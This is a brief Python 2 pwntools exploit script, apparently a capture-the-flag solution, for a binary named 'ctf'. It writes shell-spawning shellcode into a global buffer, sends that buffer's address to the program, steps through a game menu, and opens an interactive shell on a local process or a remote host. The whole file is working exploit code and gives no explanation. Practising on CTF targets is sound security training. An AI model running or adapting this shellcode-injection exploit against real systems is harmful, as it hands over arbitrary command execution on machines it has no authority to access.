#!/usr/bin/env python2

from pwn import *
#context.log_level = 0

# Setup goodies
binary = '../../games/3/ctf'
context(os = 'linux', arch = 'amd64')
elf = ELF(binary)

# Demo should work even without a HOST
if 'HOST' in args:
    r = remote(args['HOST'], int(args['PORT']))
else:
     r = process(binary)

buf_start = elf.symbols['buf']
buf_shellcode = buf_start + 8

r.recvuntil("Exits\n\n")

shellcode = flat(
    asm(shellcraft.sh())
)

r.sendline(str(buf_shellcode) + " " + shellcode)

r.sendline("m")
r.sendline("n\n"*29)
r.sendline("w")
r.sendline("q")
r.sendline("")

r.clean()
r.interactive()

